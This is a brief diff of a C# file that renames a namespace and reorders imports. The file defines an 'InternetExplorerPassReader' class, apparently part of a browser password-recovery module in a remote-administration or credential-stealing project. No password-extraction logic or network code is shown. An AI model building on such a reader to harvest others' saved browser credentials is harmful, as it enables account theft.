@@ -1,5 +1,4 @@
-﻿using Everything.Helper;
-using Microsoft.Win32;
+﻿using Microsoft.Win32;
 using Q3C273.Shared.Models;
 using System;
 using System.Collections;
@@ -10,8 +9,10 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
+using Ton618.Helper;
+using Ton618.Recovery;
 
-namespace Everything.Recovery.Browsers
+namespace Ton618.Recovery.Browsers
 {
     public class InternetExplorerPassReader : IAccountReader
     {
